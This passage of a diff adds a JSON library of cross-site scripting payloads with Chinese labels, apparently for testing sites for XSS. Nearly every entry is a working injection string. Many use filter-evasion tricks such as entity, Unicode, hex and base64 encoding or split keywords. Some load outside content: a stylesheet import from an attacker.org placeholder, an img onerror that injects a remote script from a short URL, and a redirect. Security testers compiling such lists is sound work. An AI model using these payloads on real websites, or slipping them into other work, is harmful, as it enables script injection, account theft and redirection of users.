+    "desc": "IE浏览器特有绕过过滤。",
+    "level": "low",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"vbscript:alert(1)\">Hello</a>",
+    "desc": "IE浏览器特有绕过过滤。",
+    "level": "low",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=javascript:alert(\"XSS\")>link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=`javascript:alert(\"RSnake says,'XSS'\")`>link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=javascript:alert(String.fromCharCode(88,83,83))>link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"javascript&colon;alert(1)\">link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"javaSCRIPT&colon;alert(1)\">Hello</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"javasc&NewLine;ript&colon;alert(1)\">link</a>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"javas&Tab;cript:\\u0061lert(1);\">Hello</a>",
+    "desc": "Unicode编码绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "a标签",
+      "Unicode编码"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"jav    ascript:alert('XSS')\">link</a>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"jav&#x09;ascript:alert('XSS')\">link</a>",
+    "desc": "十六进制HTML实体编码绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "a标签",
+      "HTML实体编码"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"jav&#x0D;ascript:alert('XSS')\">link</a>",
+    "desc": "十六进制HTML实体编码绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "a标签",
+      "HTML实体编码"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\" \u000e  javascript:alert('XSS');\">link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\"javascript:\\u0061lert&#x28;1&#x29\">Hello</a>",
+    "desc": "十六进制HTML实体编码，空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "HTML实体编码",
+      "Unicode编码",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\"javascript:confirm`1`\">link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\"javascript:confirm(1)\">link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=\"j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)\">1</a>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\"javascript:%61%6c%65%72%74%28%31%29\">link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\"javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(1)\">link</a>",
+    "desc": "Unicode编码，空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "Unicode编码",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=javascript:eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\")>2</a>",
+    "desc": "十六进制编码，空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "十六进制编码",
+      "JavaScript URL",
+      "eval"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=javascript:eval(\"alert('xss')\")>link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL",
+      "eval"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=javascript:alert('XSS')>link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>link</a>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>link</a>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "a标签"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A Data URI",
+    "code": "<a href=\"data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==\">test</a>",
+    "desc": "Base64编码绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "Data URI"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A Data URI",
+    "code": "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>1</a>",
+    "desc": "Base64编码绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "Data URI"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "IFRAME Data URI",
+    "code": "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
+    "desc": "Base64编码绕过过滤。",
+    "level": "high",
+    "tags": [
+      "iframe",
+      "Data URI"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "STYLE @import导入",
+    "code": "<style>@import url(\"http://attacker.org/malicious.css\");</style>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE @import导入",
+    "code": "<style>@imp\\ort url(\"http://attacker.org/malicious.css\");</style>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE @import导入",
+    "code": "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE @import导入",
+    "code": "<STYLE>@import'http://jb51.net/xss.css';</STYLE>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV Expression表达式",
+    "code": "<div style=\"color: expression(alert('XSS'))\">",
+    "desc": "IE浏览器特有绕过过滤。",
+    "level": "low",
+    "tags": [
+      "DIV标签",
+      "expression"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV Expression表达式",
+    "code": "<div style=color:expression\\(alert(1))></div>",
+    "desc": "IE浏览器特有绕过过滤。",
+    "level": "low",
+    "tags": [
+      "DIV标签",
+      "expression"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV Expression表达式",
+    "code": "<div style=\"color: '<'; color: expression(alert('XSS'))\">",
+    "desc": "IE浏览器特有绕过过滤。",
+    "level": "low",
+    "tags": [
+      "DIV标签",
+      "expression"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV Expression表达式",
+    "code": "<div style=X:expression(alert(/xss/))>",
+    "desc": "IE浏览器特有绕过过滤。",
+    "level": "low",
+    "tags": [
+      "DIV标签",
+      "expression"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV XSS注入",
+    "code": "<div style=\"x:\\65\\78\\70\\72\\65\\73\\73\\69\\6f\\6e(alert(1))\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV XSS注入",
+    "code": "<div style=\"x:\\000065\\000078\\000070\\000072\\000065\\000073\\000073\\000069\\00006f\\00006e(alert(1))\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV XSS注入",
+    "code": "<div style=\"x:\\65\\78\\70\\72\\65\\73\\73\\69\\6f\\6e\\028 alert \\028 1 \\029 \\029\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE JavaScript协议",
+    "code": "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "STYLE标签",
+      "JavaScript URL"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV JavaScript协议",
+    "code": "<DIV STYLE=\"background-image: url(\u0001javascript:alert('XSS'))\">",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "DIV标签",
+      "JavaScript URL"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE JavaScript协议",
+    "code": "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "STYLE标签",
+      "JavaScript URL"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV XSS注入",
+    "code": "<div style=\"z:exp/*anything*/res/*here*/sion(alert(1))\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV XSS注入",
+    "code": "<div style=xss:expr/*XSS*/ession(alert('XSS'))>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "XSS XSS注入",
+    "code": "</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "XSS向量"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "XSS XSS注入",
+    "code": "</XSS/*-*/STYLE=xss:e/**/xpression(window.location=\"http://www.baidu.com\")>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "XSS向量"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "IMG JavaScript协议",
+    "code": "<img STYLE=\"background-image:url(javascript:alert('XSS'))\"> //ie6",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "img标签",
+      "JavaScript URL"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "IMG XSS注入",
+    "code": "<img STYLE=\"background-image:\\75\\72\\6c\\28\\6a\\61\\76\\61\\73\\63\\72\\69\\70\\74\\3a\\61\\6c\\65\\72\\74\\28\\27\\58\\53\\53\\27\\29\\29\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "img标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<A STYLE='no\\xss:noxss(\"*//*\");xss:ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>",
+    "desc": "十六进制HTML实体编码绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "a标签",
+      "HTML实体编码"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV onclick事件",
+    "code": "<div onclick=\"alert('xss')\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onmouseenter事件",
+    "code": "<div onmouseenter=\"alert('xss')\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onclick事件",
+    "code": "<div onclick =\"alert('xss')\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG onerror事件",
+    "code": "<img/src='1'/onerror=alert(0)>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "img标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG onerror事件",
+    "code": "<img src=\"1\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\" />",
+    "desc": "十六进制HTML实体编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "img标签",
+      "事件处理器",
+      "HTML实体编码"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG onerror事件",
+    "code": "<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "img标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG onerror事件",
+    "code": "<img src=\"1\" onerror=eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\")></img>",
+    "desc": "十六进制编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "img标签",
+      "事件处理器",
+      "十六进制编码",
+      "eval"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG onmouseover事件",
+    "code": "<img src=1 onmouseover=alert('xss') a1=1111>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "img标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG onerror事件",
+    "code": "<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://t.cn/R5UpyOt';>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "img标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "A onclick事件",
+    "code": "<a href=\"#\" onclick=alert('\\170\\163\\163')>test</a>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "A onclick事件",
+    "code": "<a href=\"#\" onclick=\"\\u0061\\u006C\\u0065\\u0072\\u0074(1)\">link</a>",
+    "desc": "Unicode编码绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "事件处理器",
+      "Unicode编码"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "A onclick事件",
+    "code": "<a href=\"#\" onclick=\"\\u0061\\u006C\\u0065\\u0072\\u0074`a`\">link</a>",
+    "desc": "Unicode编码绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "事件处理器",
+      "Unicode编码"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "A onclick事件",
+    "code": "<a href=\"#\" onclick=\"alert('xss')\">link</a>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "MARQUEE onscroll事件",
+    "code": "<marquee onscroll=alert(1)> test</marquee>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "marquee标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onscroll事件",
+    "code": "<div  style=\"width:100px;height:100px;overflow:scroll\" onscroll=\"alert('a')\">123456 <br/><br/><br/><br/><br/></div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onmousewheel事件",
+    "code": "<DIV onmousewheel=\"alert('a')\" >123456</DIV><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onmouseenter事件",
+    "code": "<div style=\"background-color:red\" onmouseenter=\"alert('a')\">123456</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onmouseleave事件",
+    "code": "<DIV onmouseleave=\"alert('1')\">123456</DIV>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red\" onfocusin=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red\" onfocusout=\"alert('bem')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "MARQUEE onstart事件",
+    "code": "<marquee onstart=\"alert('a')\" >asdf</marquee>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "marquee标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onbeforecopy事件",
+    "code": "<div style=\"background-color:red;\" onbeforecopy=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onbeforecut事件",
+    "code": "<div style=\"background-color:red;\" onbeforecut=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div style=\"background-color:red;\" contentEditable=\"true\" onbeforeeditfocus=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onbeforepaste事件",
+    "code": "<div style=\"background-color:red;\" =\"true\" onbeforepaste=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV oncontextmenu事件",
+    "code": "<div style=\"background-color:red;\" oncontextmenu=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV oncopy事件",
+    "code": "<div style=\"background-color:red;\" oncopy=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" oncut=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ondrag事件",
+    "code": "<div style=\"background-color:red;\" ondrag=\"alert('1')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ondragend事件",
+    "code": "<div style=\"background-color:red;\" ondragend=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ondragenter事件",
+    "code": "<div style=\"background-color:red;\" ondragenter=\"alert('b')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" ondragleave=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" ondragover=\"alert('b')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" ondragstart=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" ondrop=\"alert('b')\" >asdf</div> <div contentEditable=\"true\" style=\"background-color:green;\" ondrop=\"alert('bem')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" onlosecapture=\"alert('b')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" onpaste=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" onselectstart=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" style=\"background-color:red;\" onhelp=\"alert('a')\" >asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onEnd事件",
+    "code": "<div STYLE=\"background-color:red;behavior:url('#default#time2')\" onEnd=\"alert('a')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV onBegin事件",
+    "code": "<div STYLE=\"background-color:red;behavior:url('#default#time2')\" onBegin=\"alert('a')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" STYLE=\"background-color:red;\" onactivate=\"alert('b')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" STYLE=\"background-color:red;filter: Alpha(opacity=100, style=2);\"onfilterchange=\"alert('b')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" onbeforeactivate=\"alert('b')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" onbeforedeactivate=\"alert('a')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "DIV ontentEditable事件",
+    "code": "<div contentEditable=\"true\" ondeactivate=\"alert('bem')\">asdf</div>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "VIDEO onloadedmetadata事件",
+    "code": "<video src=\"http://www.w3schools.com/html5/movie.ogg\" onloadedmetadata=\"alert(1)\" />",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "video标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
